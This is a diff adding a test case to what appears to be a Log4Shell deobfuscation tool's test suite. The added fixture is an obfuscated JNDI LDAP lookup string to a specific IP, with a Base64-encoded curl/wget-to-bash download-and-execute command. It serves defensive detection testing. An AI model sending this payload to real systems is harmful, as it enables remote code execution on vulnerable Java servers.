@@ -37,6 +37,8 @@ def test_deobfuscate(encoded, decoded):
          'ldap://example.com'),
         ('${${::-${::-$${::-j}}}ndi:ldap://example.com}',
          'ldap://example.com'),
+        ('${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81Mi41NC4yMzcuNjQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvNTIuNTQuMjM3LjY0OjgwKXxiYXNo}',
+         'ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81Mi41NC4yMzcuNjQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvNTIuNTQuMjM3LjY0OjgwKXxiYXNo'),  # Preserve case in URI for base64 decoding
     ]
 )
 def test_strings(encoded, decoded):
